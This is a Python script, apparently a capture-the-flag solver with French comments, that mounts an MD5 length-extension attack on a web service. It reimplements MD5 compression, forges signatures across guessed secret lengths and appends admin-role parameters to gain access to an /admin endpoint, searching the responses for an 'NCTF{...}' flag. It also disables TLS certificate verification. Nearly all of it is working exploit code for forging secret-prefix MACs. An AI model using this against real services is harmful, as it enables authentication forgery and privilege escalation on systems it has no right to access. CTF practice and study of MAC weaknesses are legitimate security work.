#!/usr/bin/env python3
# MD5 length-ext : trouve la bonne longueur de secret (sig acceptee) puis le role admin.
# python3 agbale2.py <url>
import sys, ssl, json, re, struct, math, urllib.request, urllib.parse, urllib.error
B=sys.argv[1].rstrip("/")
CTX=ssl.create_default_context();CTX.check_hostname=False;CTX.verify_mode=ssl.CERT_NONE
def get(path):
    try:
        r=urllib.request.urlopen(urllib.request.Request(B+path),context=CTX,timeout=15)
        return r.getcode(), r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")
    except Exception as e:
        return 0, f"ERR {e}"
_s=[7,12,17,22]*4+[5,9,14,20]*4+[4,11,16,23]*4+[6,10,15,21]*4
_K=[int(abs(math.sin(i+1))*2**32)&0xffffffff for i in range(64)]
def _c(st,blk):
    a,b,c,d=st;M=struct.unpack('<16I',blk);A,B,C,D=a,b,c,d
    for i in range(64):
        if i<16:f=(B&C)|(~B&D);g=i
        elif i<32:f=(D&B)|(~D&C);g=(5*i+1)%16
        elif i<48:f=B^C^D;g=(3*i+5)%16
        else:f=C^(B|(~D&0xffffffff));g=(7*i)%16
        f=(f+A+_K[i]+M[g])&0xffffffff;A=D;D=C;C=B
        B=(B+(((f<<_s[i])|(f>>(32-_s[i])))&0xffffffff))&0xffffffff
    return [(a+A)&0xffffffff,(b+B)&0xffffffff,(c+C)&0xffffffff,(d+D)&0xffffffff]
def pad(n): return b'\x80'+b'\x00'*((56-(n+1)%64)%64)+struct.pack('<Q',n*8)
def extend(h,add,pl):
    st=list(struct.unpack('<4I',bytes.fromhex(h)));proc=pl+len(pad(pl))
    data=add+pad(proc+len(add))
    for i in range(0,len(data),64): st=_c(st,data[i:i+64])
    return struct.pack('<4I',*st).hex()

code,raw=get("/sign");print("[/sign]",raw[:120])
j=json.loads(raw)
mk=next(k for k in("msg","message","data","token","cmd") if k in j)
sk=next(k for k in("sig","signature","mac","hash","tag") if k in j and k!=mk)
msg=j[mk].encode();sig=j[sk];print(f"[*] {mk}={msg!r} {sk}={sig}\n")

appends=[b"&user=admin",b"&role=admin",b"&admin=true",b"&admin=1",b"&is_admin=1",
         b"&user=admin&role=admin",b"&role=admin&user=admin",b";user=admin"]
goodlen=None
for kl in range(1,65):
    for add in appends:
        nm=msg+pad(kl+len(msg))+add
        ns=extend(sig,add,kl+len(msg))
        c,b=get(f"/admin?{mk}={urllib.parse.quote(nm,safe='')}&{sk}={ns}")
        if re.search(r"NCTF\{[^}]*\}",b):
            print(f"[+] klen={kl} add={add!r}\n[/admin {c}] {b[:300]}");sys.exit(0)
        if "bad sig" not in b.lower():          # sig acceptee => bonne longueur
            if goodlen!=kl: print(f"[OK-SIG] klen={kl} -> sig acceptee !")
            goodlen=kl
            print(f"   add={add!r:28} -> {c} {b[:60]!r}")
print("\n[-] fin. goodlen=",goodlen,"-> si sig acceptee mais pas de flag, colle ces lignes, j'ajuste l'append.")
